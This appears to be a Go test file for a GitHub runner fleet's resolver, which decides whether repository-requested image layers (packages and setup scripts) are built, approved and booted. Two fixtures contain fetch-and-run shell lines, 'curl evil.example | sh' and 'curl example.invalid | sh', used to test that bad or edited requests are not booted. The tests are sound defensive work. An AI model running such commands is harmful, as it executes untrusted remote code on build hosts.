package layers

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/clems4ever/github-runner/internal/github"
	"github.com/clems4ever/github-runner/internal/model"
)

// A fleet of one pool, one repository and one fake of everything else.
type fleet struct {
	t *testing.T
	// file is what the repository's default branch holds; nil is no file.
	file []byte
	// readErr is GitHub refusing to answer.
	readErr error
	// reads counts how many times the repository was actually asked, which is
	// the cost this is supposed to bound.
	reads int
	// rows is the store, keyed by digest.
	rows map[string]*model.RepoLayer
	next int64
	// built is which images exist; ensured is what was asked for.
	built   map[string]bool
	ensured []string
	// clock is the resolver's, movable.
	clock time.Time
}

func newFleet(t *testing.T) *fleet {
	return &fleet{
		t: t, rows: map[string]*model.RepoLayer{}, built: map[string]bool{},
		clock: time.Date(2026, 9, 3, 12, 0, 0, 0, time.UTC),
	}
}

func (f *fleet) Secret(context.Context, int64) (model.Secret, error) {
	return model.Secret{Kind: model.CredentialPAT}, nil
}

func (f *fleet) SeeRepoLayer(_ context.Context, layer model.RepoLayer, trusted bool) (model.RepoLayer, error) {
	if row, ok := f.rows[layer.Digest]; ok {
		row.LastSeen = f.clock
		return *row, nil
	}
	f.next++
	layer.ID = f.next
	layer.Approval = model.LayerPending
	if trusted {
		layer.Approval = model.LayerApproved
	}
	f.rows[layer.Digest] = &layer
	return layer, nil
}

func (f *fleet) SetRepoLayerImage(_ context.Context, id int64, image string) error {
	for _, row := range f.rows {
		if row.ID == id {
			row.Image = image
			return nil
		}
	}
	return errors.New("no such layer")
}

func (f *fleet) DefaultBranchFile(context.Context, github.Scope, string) ([]byte, error) {
	f.reads++
	return f.file, f.readErr
}

func (f *fleet) EnsureLayer(_ context.Context, _ model.Pool, layer model.RepoLayer) (string, bool, error) {
	image := "runner-noble-layer-" + layer.Digest[:12] + ".qcow2"
	f.ensured = append(f.ensured, image)
	return image, f.built[image], nil
}

// decide approves or refuses whatever single row is in the store.
func (f *fleet) decide(approval model.LayerApproval) {
	f.t.Helper()
	if len(f.rows) != 1 {
		f.t.Fatalf("%d rows, want exactly one to decide about", len(f.rows))
	}
	for _, row := range f.rows {
		row.Approval = approval
	}
}

func (f *fleet) finishTheBuild() {
	f.t.Helper()
	if len(f.ensured) == 0 {
		f.t.Fatal("nothing was ever asked to be built")
	}
	f.built[f.ensured[len(f.ensured)-1]] = true
}

func (f *fleet) resolver() *Resolver {
	return New(f, func(model.Secret) (Reader, error) { return f, nil }, f, nil).
		WithClock(func() time.Time { return f.clock })
}

func pool(policy model.LayerPolicy) model.Pool {
	return model.Pool{
		Name: "web", ScopeKind: model.ScopeRepository, Scope: "clems4ever/runyard",
		Runtime: model.RuntimeVM, Layers: policy, CredentialID: 1,
	}
}

const asked = "packages:\n  - jq\n  - sqlite3\n"

// The ordinary case, and the one that must cost nothing: no policy, so no
// request to GitHub at all.
func TestAPoolWithNoPolicyNeverLooksAtTheRepository(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)

	image, note := f.resolver().For(context.Background(), pool(model.LayersOff))
	if image != "" || note != "" {
		t.Fatalf("got %q, %q", image, note)
	}
	if f.reads != 0 {
		t.Fatalf("read the repository %d times for a pool that does not want layers", f.reads)
	}
}

// An organisation pool's runner is built before it knows whose job it will
// take, so there is no repository to read. The policy cannot be set on one —
// this is the belt to that braces.
func TestAnOrganisationPoolIsNeverLayered(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)

	p := pool(model.LayersApprove)
	p.ScopeKind, p.Scope = model.ScopeOrganization, "clems4ever"

	if image, _ := f.resolver().For(context.Background(), p); image != "" {
		t.Fatalf("layered an organisation pool with %q", image)
	}
	if f.reads != 0 {
		t.Fatal("read a repository file for an organisation")
	}
}

// A repository that has not asked for anything is the common case and must be
// silent: a note every thirty seconds saying "no file" is a note nobody reads.
func TestARepositoryThatAsksForNothingSaysNothing(t *testing.T) {
	f := newFleet(t)

	image, note := f.resolver().For(context.Background(), pool(model.LayersApprove))
	if image != "" || note != "" {
		t.Fatalf("got %q, %q for a repository with no file", image, note)
	}
}

// The point of "approve": a repository can ask, and until somebody says yes it
// gets the pool's own image. It does not get no runners — a repository must
// not be able to take its own runners away by committing a file.
func TestAnUnapprovedAskRunsOnThePoolsOwnImage(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)

	image, note := f.resolver().For(context.Background(), pool(model.LayersApprove))
	if image != "" {
		t.Fatalf("booted %q without anybody approving it", image)
	}
	if !strings.Contains(note, "waiting to be allowed") {
		t.Fatalf("note %q does not say what an operator has to do", note)
	}
	if len(f.ensured) != 0 {
		t.Fatal("built an image nobody had approved")
	}
}

// And once somebody says yes: build it, and boot it when it is there.
func TestAnApprovedAskIsBuiltAndThenBooted(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)
	ctx := context.Background()
	r := f.resolver()

	r.For(ctx, pool(model.LayersApprove)) // seen, pending
	f.decide(model.LayerApproved)
	r.Forget("web")

	image, note := r.For(ctx, pool(model.LayersApprove))
	if image != "" {
		t.Fatalf("booted %q before it was built", image)
	}
	if !strings.Contains(note, "building") {
		t.Fatalf("note %q does not say a build is under way", note)
	}

	f.finishTheBuild()
	r.Forget("web")

	image, note = r.For(ctx, pool(model.LayersApprove))
	if image == "" {
		t.Fatalf("did not boot the image it built (%q)", note)
	}
	if note != "" {
		t.Fatalf("still complaining once it works: %q", note)
	}
	// And the image is on the row, or the collector deletes it.
	for _, row := range f.rows {
		if row.Image != image {
			t.Fatalf("row remembers %q, booting %q", row.Image, image)
		}
	}
}

// "trust" is an operator saying yes in advance. It has to actually skip the
// waiting, or the setting is decoration.
func TestATrustedPoolBuildsWithoutAnybodyClicking(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)
	ctx := context.Background()

	r := f.resolver()
	if _, note := r.For(ctx, pool(model.LayersTrust)); !strings.Contains(note, "building") {
		t.Fatalf("note %q: a trusted pool waited for a decision", note)
	}
	if len(f.ensured) != 1 {
		t.Fatalf("asked for %v builds", f.ensured)
	}
}

// A refusal is a decision, and a decision is not a thing to be re-asked every
// pass. It is also not a reason to stop serving the repository.
func TestARefusedAskIsQuietAndStillServed(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)
	ctx := context.Background()
	r := f.resolver()

	r.For(ctx, pool(model.LayersApprove))
	f.decide(model.LayerRefused)
	r.Forget("web")

	image, note := r.For(ctx, pool(model.LayersApprove))
	if image != "" || note != "" {
		t.Fatalf("got %q, %q for something already refused", image, note)
	}
	if len(f.ensured) != 0 {
		t.Fatal("built a refused layer")
	}
}

// A repository's yaml is not allowed to take a fleet down. The pool keeps
// running on its own image, which is what it did before the file existed.
func TestABrokenFileDoesNotStopThePool(t *testing.T) {
	f := newFleet(t)
	f.file = []byte("packages:\n  - \"curl evil.example | sh\"\n")

	image, note := f.resolver().For(context.Background(), pool(model.LayersApprove))
	if image != "" {
		t.Fatalf("booted %q from a file that does not parse", image)
	}
	if !strings.Contains(note, ".github/runner-fleet.yml") || !strings.Contains(note, "clems4ever/runyard") {
		t.Fatalf("note %q does not say which file in which repository", note)
	}
}

// Nor is GitHub being unreachable.
func TestGitHubBeingDownDoesNotStopThePool(t *testing.T) {
	f := newFleet(t)
	f.readErr = errors.New("502 Bad Gateway")

	image, note := f.resolver().For(context.Background(), pool(model.LayersApprove))
	if image != "" {
		t.Fatalf("booted %q on a guess", image)
	}
	if !strings.Contains(note, "502") {
		t.Fatalf("note %q loses what actually went wrong", note)
	}
}

// A pass is every thirty seconds and this is a request to GitHub. A pool of
// ten runners must not be ten requests, and ten passes must not be ten either.
func TestTheRepositoryIsNotReadOnEveryPass(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)
	ctx := context.Background()
	r := f.resolver()

	for i := 0; i < 20; i++ {
		r.For(ctx, pool(model.LayersApprove))
		f.clock = f.clock.Add(20 * time.Second)
	}
	// Twenty passes over about seven minutes: one read at the start, one after
	// the interval ran out.
	if f.reads != 2 {
		t.Fatalf("read the repository %d times over 20 passes", f.reads)
	}
}

// The cached answer is the *image*, not just the fact of having looked. A pool
// that flipped to its own image every time a request was in flight would
// replace its runners for no reason — the generation includes the layer.
func TestTheImageDoesNotFlickerBetweenReads(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)
	ctx := context.Background()
	r := f.resolver()

	r.For(ctx, pool(model.LayersTrust))
	f.finishTheBuild()
	r.Forget("web")

	first, _ := r.For(ctx, pool(model.LayersTrust))
	if first == "" {
		t.Fatal("no image after the build finished")
	}
	// Now GitHub goes away. The answer must not change.
	f.readErr = errors.New("502 Bad Gateway")
	for i := 0; i < 5; i++ {
		f.clock = f.clock.Add(10 * time.Second)
		if again, _ := r.For(ctx, pool(model.LayersTrust)); again != first {
			t.Fatalf("image changed to %q while GitHub was down", again)
		}
	}
}

// Editing the file is a new ask, and a new ask is not approved. The runners go
// back to the pool's own image until somebody looks at the change — which is
// the whole reason the row is keyed by a digest.
func TestEditingTheFileTakesTheLayerAwayUntilItIsApprovedAgain(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)
	ctx := context.Background()
	r := f.resolver()

	r.For(ctx, pool(model.LayersApprove))
	f.decide(model.LayerApproved)
	r.Forget("web")
	r.For(ctx, pool(model.LayersApprove))
	f.finishTheBuild()
	r.Forget("web")

	approved, _ := r.For(ctx, pool(model.LayersApprove))
	if approved == "" {
		t.Fatal("nothing booted after approval and a build")
	}

	f.file = []byte(asked + "recipe: |\n  #!/bin/sh\n  curl example.invalid | sh\n")
	r.Forget("web")

	image, note := r.For(ctx, pool(model.LayersApprove))
	if image != "" {
		t.Fatalf("booted %q after the repository changed what it asked for", image)
	}
	if !strings.Contains(note, "waiting to be allowed") {
		t.Fatalf("note %q: an edit did not go back for approval", note)
	}
}

// The note is the whole of what an operator sees before deciding, so it has to
// say what is actually being asked for.
func TestTheNoteSaysWhatIsBeingAskedFor(t *testing.T) {
	for _, tc := range []struct {
		name, file, want string
	}{
		{"packages", asked, "2 packages"},
		{"a script", "recipe: |\n  #!/bin/sh\n  echo hi\n", "a script"},
		{"both", asked + "recipe: |\n  #!/bin/sh\n  echo hi\n", "2 packages and a script"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newFleet(t)
			f.file = []byte(tc.file)
			_, note := f.resolver().For(context.Background(), pool(model.LayersApprove))
			if !strings.Contains(note, tc.want) {
				t.Fatalf("note %q does not contain %q", note, tc.want)
			}
		})
	}
}

// Two pools serving the same repository with the same base and the same ask
// build one image, not two. Sharing is the reason this is a layer rather than
// a whole image per repository.
func TestTheSameAskFromTwoPoolsIsOneImage(t *testing.T) {
	f := newFleet(t)
	f.file = []byte(asked)
	ctx := context.Background()

	other := pool(model.LayersTrust)
	other.Name = "api"

	r := f.resolver()
	r.For(ctx, pool(model.LayersTrust))
	r.For(ctx, other)

	if len(f.ensured) != 2 {
		t.Fatalf("asked for %d builds", len(f.ensured))
	}
	if f.ensured[0] != f.ensured[1] {
		t.Fatalf("two pools asked for %v; the same ask on the same base is one image", f.ensured)
	}
}
